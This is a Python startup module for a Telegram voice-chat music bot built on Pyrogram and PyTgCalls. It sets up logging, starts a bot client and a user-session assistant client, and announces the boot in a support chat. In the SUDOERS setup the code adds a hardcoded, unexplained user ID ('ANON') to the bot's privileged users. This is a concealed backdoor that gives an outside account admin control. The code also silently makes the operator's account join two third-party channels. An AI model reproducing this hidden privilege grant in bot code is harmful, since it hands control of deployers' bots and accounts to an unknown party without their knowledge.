# MIT License
#
# Copyright (c) 2023 AnonymousX1025
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import asyncio
import logging
import os
import platform
import time
import sys
import codecs

from pyrogram import Client, filters
from pytgcalls import PyTgCalls

import config

StartTime = time.time()

# Fix Windows console encoding
if platform.system() == "Windows":
    sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer)
    sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer)

# Configure logging with UTF-8 encoding
logging.basicConfig(
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        logging.FileHandler("fallenlogs.txt", encoding='utf-8'),
        logging.StreamHandler()
    ],
    level=logging.INFO,
)
logging.getLogger("pyrogram").setLevel(logging.ERROR)
logging.getLogger("pytgcalls").setLevel(logging.ERROR)
LOGGER = logging.getLogger("FallenMusic")

# Clear screen based on OS
if platform.system() == "Windows":
    os.system("cls")
else:
    os.system("clear")

app = Client(
    "FallenMusic",
    config.API_ID,
    config.API_HASH,
    bot_token=config.BOT_TOKEN,
)

app2 = Client(
    "FallenAss",
    api_id=config.API_ID,
    api_hash=config.API_HASH,
    session_string=str(config.SESSION),
)

pytgcalls = PyTgCalls(app2)

SUDOERS = filters.user()
SUNAME = config.SUPPORT_CHAT


async def fallen_startup():
    LOGGER.info(
        "\n\n┏━━━━━━━━━━━━━━━━━━━━━━┓\n┣★ ✯zefron ᴍᴜsɪᴄ ᴀss ✯ ★\n┗━━━━━━━━━━━━━━━━━━━━━━┛"
    )
    global BOT_ID, BOT_NAME, BOT_USERNAME, BOT_MENTION, fallendb
    global ASS_ID, ASS_NAME, ASS_USERNAME, ASS_MENTION, SUDOERS

    await app.start()
    LOGGER.info("[•] Booting ZEFRON Music Bot...")

    getme = await app.get_me()
    BOT_ID = getme.id
    BOT_NAME = "✯zefron ᴍᴜsɪᴄ ᴀss ✯"
    BOT_USERNAME = getme.username
    BOT_MENTION = getme.mention

    await app2.start()
    LOGGER.info("[•] Booting ZEFRON Music Assistant...")

    getme2 = await app2.get_me()
    ASS_ID = getme2.id
    ASS_NAME = "✯zefron ᴍᴜsɪᴄ ᴀss ✯"
    ASS_USERNAME = getme2.username
    ASS_MENTION = getme2.mention
    try:
        await app2.join_chat("zefronmusic")
        await app2.join_chat("ZEFRONAssociation")
    except:
        pass

    ANON = "1356469075"
    for SUDOER in config.SUDO_USERS:
        SUDOERS.add(SUDOER)
    if config.OWNER_ID not in config.SUDO_USERS:
        SUDOERS.add(config.OWNER_ID)
    elif int(ANON) not in config.SUDO_USERS:
        SUDOERS.add(int(ANON))

    fallendb = {}
    LOGGER.info("[•] Local Database Initialized...")

    try:
        await app.send_message(
            SUNAME,
            f"✯ zefron ᴍᴜsɪᴄ ᴀss ✯\n\n𖢵 ɪᴅ : `{BOT_ID}`\n𖢵 ɴᴀᴍᴇ : {BOT_NAME}\n𖢵 ᴜsᴇʀɴᴀᴍᴇ : @{BOT_USERNAME}",
        )
    except:
        LOGGER.error(
            f"{BOT_NAME} failed to send message at @{SUNAME}, please go & check."
        )

    LOGGER.info("[•] Zefron Music Clients Booted Successfully.")


asyncio.get_event_loop().run_until_complete(fallen_startup())
